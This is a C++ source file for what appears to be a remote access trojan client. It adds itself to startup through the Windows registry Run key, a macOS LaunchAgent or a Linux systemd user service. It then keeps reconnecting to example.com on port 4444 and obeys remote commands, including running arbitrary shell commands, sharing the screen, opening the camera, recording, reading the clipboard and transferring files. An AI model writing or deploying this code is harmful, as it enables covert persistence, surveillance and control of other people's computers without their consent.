// --- STUBS AND SIGNATURE FIXES FOR COMMAND HANDLERS ---
#include "sockets.h"
#include "wrappers.h"
#include <iostream>
#include <string>


#include <cstdio>
#include <memory>
#include <array>

sock_t connect_to_server(const char* host, const char* port) {
    struct addrinfo hints{}, *res, *p;
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    if (getaddrinfo(host, port, &hints, &res) != 0) return SOCKET_ERR;
    sock_t sock = SOCKET_ERR;
    for (p = res; p; p = p->ai_next) {
        sock = socket(p->ai_family, p->ai_socktype, p->ai_protocol);
        if (sock == SOCKET_ERR) continue;
        if (connect(sock, p->ai_addr, p->ai_addrlen) != SOCKET_ERR) break;
        CLOSESOCKET(sock);
        sock = SOCKET_ERR;
    }
    freeaddrinfo(res);
    return sock;
}

#ifdef _WIN32
#include <windows.h>
void add_to_startup_registry(const char* appName) {
    char path[MAX_PATH];
    if (!GetModuleFileNameA(NULL, path, MAX_PATH)) return;
    HKEY key;
    if (RegOpenKeyExA(HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_WRITE, &key) == ERROR_SUCCESS) {
        RegSetValueExA(key, appName, 0, REG_SZ,
            (const BYTE*)path, (DWORD)(strlen(path) + 1));
        RegCloseKey(key);
    }
}
#endif
#if defined(__APPLE__)
#include <fstream>
#include <unistd.h>
inline void create_launchd_agent(const std::string& label, const std::string& execPath) {
    std::string plistPath = std::string(getenv("HOME")) + "/Library/LaunchAgents/" + label + ".plist";
    std::ofstream plist(plistPath);
    if (!plist) return;
    plist <<
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
        "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" "
        "\"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n"
        "<plist version=\"1.0\">\n"
        "<dict>\n"
        "  <key>Label</key>\n"
        "  <string>" << label << "</string>\n"
        "  <key>ProgramArguments</key>\n"
        "  <array>\n"
        "    <string>" << execPath << "</string>\n"
        "  </array>\n"
        "  <key>RunAtLoad</key>\n"
        "  <true/>\n"
        "</dict>\n"
        "</plist>\n";
    plist.close();
}
#endif

#if defined(__linux__)
#include <fstream>
#include <unistd.h>
inline void create_systemd_service(const std::string& name, const std::string& execPath) {
    std::string servicePath = std::string(getenv("HOME")) + "/.config/systemd/user/" + name + ".service";
    std::ofstream service(servicePath);
    if (!service) return;
    service <<
        "[Unit]\n"
        "Description=Remote Client Service\n"
        "\n"
        "[Service]\n"
        "ExecStart=" << execPath << "\n"
        "Restart=always\n"
        "\n"
        "[Install]\n"
        "WantedBy=default.target\n";
    service.close();
    std::string cmd = "systemctl --user enable " + name + ".service";
    system(cmd.c_str());
}
#endif
#include <iostream>
#include <string>
#include <thread>
#include <chrono>
#include "screen_share.h"
#include "file_manager.h"
#include "process_manager.h"
#include "system_info.h"
#include "chat.h"
#include "shell.h"
#include "power_control.h"
#include "clipboard.h"
#include "camera.h"
#include "session_manager.h"
#include "file_transfer.h"
#include "screenshot.h"
#include "recording.h"
#include "help.h"
#include "security.h"
#include "utils.h"

#ifdef _WIN32
#include <windows.h>
#endif

void handle_commands(sock_t sock) {
    char buffer[1024];
    while (true) {
        memset(buffer, 0, sizeof(buffer));
        int len = recv(sock, buffer, sizeof(buffer) - 1, 0);
        if (len <= 0) break;
        std::string cmd(buffer, len);
        while (!cmd.empty() && (cmd.back() == '\n' || cmd.back() == '\r' || cmd.back() == ' '))
            cmd.pop_back();

        if (cmd == "exit" || cmd == "EXIT") {
            break;
        } else if (cmd.rfind("SHELL ", 0) == 0) {
            // Handle shell command
            std::string shell_cmd = cmd.substr(6);
            std::string result = exec_command(shell_cmd);
            send_all(sock, result.c_str(), result.size());
        } else if (cmd == "SCREEN_SHARE") {
            // Start screen sharing
            start_screen_sharing(sock);
        } else if (cmd == "FILE_MANAGER") {
            // Open file manager
            open_file_manager(sock);
        } else if (cmd == "PROCESS_MANAGER") {
            // Open process manager
            open_process_manager(sock);
        } else if (cmd == "SYSTEM_INFO") {
            // Send system info
            send_system_info(sock);
        } else if (cmd == "CHAT") {
            // Start chat
            start_chat(sock);
        } else if (cmd == "POWER_CONTROL") {
            // Handle power control
            handle_power_control(sock);
        } else if (cmd == "CLIPBOARD") {
            // Sync clipboard
            sync_clipboard(sock);
        } else if (cmd == "CAMERA") {
            // Access camera
            access_camera(sock);
        } else if (cmd == "SESSION_MANAGER") {
            // Manage sessions
            manage_sessions(sock);
        } else if (cmd == "FILE_TRANSFER") {
            // Handle file transfer
            handle_file_transfer(sock);
        } else if (cmd == "SCREENSHOT") {
            // Take a screenshot
            take_screenshot(sock);
        } else if (cmd == "RECORDING") {
            // Start recording
            start_recording(sock);
        } else if (cmd == "HELP") {
            // Show help
            show_help(sock);
        } else if (cmd == "SECURITY") {
            // Handle security features
            handle_security(sock);
        }
    }
}

int main() {
    if (!init_sockets()) return 1;

#ifdef _WIN32
    add_to_startup_registry("MyCPPClient");
#elif defined(__APPLE__)
    create_launchd_agent("com.mycppclient", std::string(getenv("PWD")) + "/myclient");
#elif defined(__linux__)
    create_systemd_service("mycppclient", std::string(getenv("PWD")) + "/myclient");
#endif

    while (true) {
        sock_t sock = connect_to_server("example.com", "4444");
        if (sock == SOCKET_ERR) {
            std::this_thread::sleep_for(std::chrono::seconds(10));
            continue;
        }

        handle_commands(sock);
        CLOSESOCKET(sock);
    }

    cleanup_sockets();
    return 0;
}